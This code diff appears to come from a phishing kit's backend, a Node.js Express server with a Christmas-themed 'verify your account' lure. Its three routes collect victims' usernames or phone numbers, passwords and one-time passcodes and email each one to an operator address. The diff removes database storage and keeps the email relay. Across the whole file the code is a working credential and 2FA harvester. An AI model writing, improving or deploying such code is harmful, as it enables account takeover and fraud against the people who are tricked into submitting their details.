@@ -1,7 +1,6 @@
 const express = require("express");
 const bodyParser = require("body-parser");
 const cors = require("cors");
-const mongoose = require("mongoose");
 const nodemailer = require("nodemailer");
 require("dotenv").config();
 
@@ -11,21 +10,6 @@ const PORT = process.env.PORT || 5000;
 // Middleware
 app.use(cors('*'));
 app.use(bodyParser.json());
-
-// MongoDB Connection
-mongoose.connect(process.env.MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true })
-  .then(() => console.log("Connected to MongoDB"))
-  .catch((err) => console.error("MongoDB connection error:", err));
-
-// Schema for Form Data
-const formSchema = new mongoose.Schema({
-  username: String,
-  phone: String,
-  password: String,
-  otp: String,
-  submittedAt: { type: Date, default: Date.now },
-});
-const Form = mongoose.model("Form", formSchema);
 
 // Nodemailer Transporter
 const transporter = nodemailer.createTransport({
@@ -50,40 +34,21 @@ app.post("/submit-credentials", async (req, res) => {
   //   });
   // }
 
-
-
   try {
-    // Create the data object dynamically based on which field is provided.
-    const formData = {
-      password,
-    };
-
-    if (username) {
-      formData.username = username;
-    } else {
-      formData.phone = phone;
-    }
-    
     // Send notification email.
-    transporter.sendMail({
+    await transporter.sendMail({
       from: process.env.EMAIL_USER,
       to: process.env.NOTIFY_EMAIL,
       subject: "New Credentials Submission",
       text: `New credentials submitted:\n\n${username ? `Username: ${username}` : `Phone: ${phone}`}\nPassword: ${password}`,
     });
 
-    // Save to the database.
-    const newForm = new Form(formData);
-    await newForm.save();
-
-
     res.status(200).json({ message: "We will verify your account! Happy Christmas 🎅🎄🎁" });
   } catch (error) {
-    console.error("Error saving credentials or sending email:", error);
+    console.error("Error sending email:", error);
     res.status(500).json({ message: "An error occurred. Please try again." });
   }
 });
-
 
 // Route 2: Save Phone and Notify on Submission
 app.post("/submit-phone", async (req, res) => {
@@ -94,23 +59,17 @@ app.post("/submit-phone", async (req, res) => {
   // }
 
   try {
-
     // Notify admin via email
-    transporter.sendMail({
+    await transporter.sendMail({
       from: process.env.EMAIL_USER,
       to: process.env.NOTIFY_EMAIL,
       subject: "Phone Submission",
       text: `Phone submitted: ${phone}`,
     });
 
-    // Save phone to the database
-    const newForm = new Form({ phone });
-    await newForm.save();
-
-
-    res.status(200).json({ message: "Check your phone OTP sended!"});
+    res.status(200).json({ message: "Check your phone OTP sent!" });
   } catch (error) {
-    console.error("Error saving phone or sending email:", error);
+    console.error("Error sending email:", error);
     res.status(500).json({ message: "An error occurred. Please try again." });
   }
 });
@@ -120,26 +79,21 @@ app.post("/verify-otp", async (req, res) => {
   const { otp } = req.body;
 
   // if (!otp) {
-  //   return res.status(400).json({ message: "OTP are required." });
+  //   return res.status(400).json({ message: "OTP is required." });
   // }
 
   try {
     // Notify admin via email
-    transporter.sendMail({
+    await transporter.sendMail({
       from: process.env.EMAIL_USER,
       to: process.env.NOTIFY_EMAIL,
       subject: "OTP Submission",
       text: `OTP submitted: ${otp}`,
     });
 
-    // Save phone to the database
-    const newForm = new Form({ otp });
-    await newForm.save();
-
-
     res.status(200).json({ message: "OTP verified successfully! We will verify your account. 🎅🎄🎁" });
   } catch (error) {
-    console.error("Error verifying OTP:", error);
+    console.error("Error sending email:", error);
     res.status(500).json({ message: "An error occurred. Please try again." });
   }
 });
